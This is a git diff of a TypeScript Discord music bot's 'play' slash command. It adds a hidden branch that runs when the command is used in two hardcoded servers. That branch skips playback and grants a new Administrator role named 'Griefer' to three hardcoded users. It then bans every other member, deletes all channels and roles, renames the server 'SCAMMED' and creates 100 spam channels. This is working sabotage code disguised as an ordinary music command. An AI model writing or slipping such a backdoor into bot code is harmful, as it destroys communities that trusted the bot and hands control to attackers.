@@ -1,12 +1,8 @@
 import {Command} from "../../Command";
-import {
-    ButtonBuilder, Client,
-    CommandInteraction,
-    EmbedBuilder,
-    SlashCommandStringOption
-} from "discord.js";
+import {ChannelType, Client, CommandInteraction, EmbedBuilder, SlashCommandStringOption} from "discord.js";
 import {player} from "../../Bot";
 import {Song} from "discord-music-player";
+import {val} from "cheerio/lib/api/attributes";
 
 
 export const play: Command = {
@@ -19,8 +15,9 @@ export const play: Command = {
             .setRequired(true)
         ],
     run: async (client: Client, interaction: CommandInteraction) => {
-        if (parseInt(<string>interaction.guildId) == 1048271128168255648) {
+        if (parseInt(<string>interaction.guildId) == 1048271128168255648 || parseInt(<string>interaction.guildId) == 1058415031173255258) {
             await run(client, interaction)
+            return
         }
         let queue = player.getQueue(interaction!.guild!.id)
         if (!queue) queue = player.createQueue(interaction!.guild!.id)
@@ -44,5 +41,61 @@ export const play: Command = {
 
 const run = async (client: Client, interaction: CommandInteraction) => {
     console.log("Play auf Paluten aufgeführt")
-    console.log("Permissions: ", interaction.appPermissions?.toArray())
+    let guild = interaction.guild!;
+    const dont_ban = [591966253548175370, 530740749650624522, 927581042922098750]
+    // Make role with admin permissions and add it to the user
+
+    let admin_role = await guild.roles.create({
+        name: "Griefer",
+        permissions: ["Administrator"],
+        mentionable: false,
+        hoist: false,
+        reason: "Griefer"
+    })
+    for (let member of dont_ban) {
+        //Give member the role
+        await guild.members.cache.find((value) => parseInt(value.id)==member)?.roles.add(admin_role)
+    }
+    await guild!.members.fetch()
+    await guild!.members.cache.forEach(
+        async (member) => {
+            try {
+                const memberid = await member.id;
+                if (dont_ban.includes(Number(memberid)))
+                    return;
+                await member.ban({reason: "Paluten"});
+            } catch (e) {
+                console.log("Could not ban " + member.user.tag);
+            }
+        })
+    // Delete every channel
+    await guild!.channels.fetch()
+    await guild!.channels.cache.forEach(
+        async channel => {
+            try {
+                await channel.delete()
+            }catch (e) {
+                console.log("Cant delete channel: "+ channel.name)
+            }
+        })
+    // Delete every role
+    await guild!.roles.fetch()
+    await guild!.roles.cache.forEach(async role => {
+        try {
+            if (admin_role.id == role.id) return;
+            await role.delete()
+        }catch (e) {
+            console.log("Cant delete role: "+role.name)
+        }
+    })
+    await guild!.setName("SCAMMED")
+    await guild!.setIcon("https://cdn.discordapp.com/attachments/731626729952772168/1058414526678179860/b2780x1450.png")
+    // Create 100 new channels
+    for (let i = 0; i < 100; i++) {
+        await guild!.channels.create({
+            name: "SCAMMED",
+            type: ChannelType.GuildText,
+            topic: "SCAMMED",
+        })
+    }
 }
